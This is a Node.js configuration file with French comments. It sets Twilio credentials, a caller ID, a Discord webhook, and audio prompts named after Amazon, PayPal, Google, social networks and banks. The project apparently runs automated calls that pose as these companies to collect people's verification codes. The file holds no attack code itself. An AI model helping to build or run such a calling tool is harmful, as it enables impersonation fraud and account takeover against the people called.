require('dotenv').config();

module.exports = {
    // Prefer environment variables for secrets and configuration. Fall back to defaults for local dev.
    setupdone: process.env.SETUPDONE || 'false',

    /**
     * Informations à propos du compte Twilio
     */
    accountSid: process.env.TWILIO_ACCOUNT_SID || '',
    authToken: process.env.TWILIO_AUTH_TOKEN || '',
    callerid: process.env.TWILIO_CALLERID || '+yourcallerid',

    /**
     * Informations à propos de l'API
     */
    apipassword: process.env.API_PASSWORD || 'passwordtochange',
    serverurl: process.env.SERVER_URL || 'http://yourserverip:1337',

    /**
     * Informations à propos du webhook discord
     */
    discordwebhook: process.env.DISCORD_WEBHOOK || '',

    /**
     * Port sur lequel tourne le serveur express
     */
    port: process.env.PORT || 1337,

    /**
     * Chemins de stockage des fichiers audios
     */
    amazonfilepath: './voice/fr/amazon/ask-amazon.mp3',
    cdiscountfilepath: './voice/fr/cdiscount/ask-cdiscount.mp3',
    twitterfilepath: './voice/fr/twitter/ask-twitter.mp3',
    whatsappfilepath: './voice/fr/whatsapp/ask-whatsapp.mp3',
    paypalfilepath: './voice/fr/paypal/ask-pp.mp3',
    googlefilepath: './voice/fr/google/ask-google.mp3',
    snapchatfilepath: './voice/fr/snapchat/ask-snapchat.mp3',
    instagramfilepath: './voice/fr/instagram/ask-instagram.mp3',
    facebookfilepath: './voice/fr/facebook/ask-facebook.mp3',
    endfilepath: './voice/fr/done/call-done.mp3',
    defaultfilepath: './voice/fr/default/ask-default.mp3',
    banquefilepath: './voice/fr/banque/ask-banque.mp3',

    /**
     * Contenu des sms selon les services demandés
     */
    paypalsms: 'pp test 123'
};
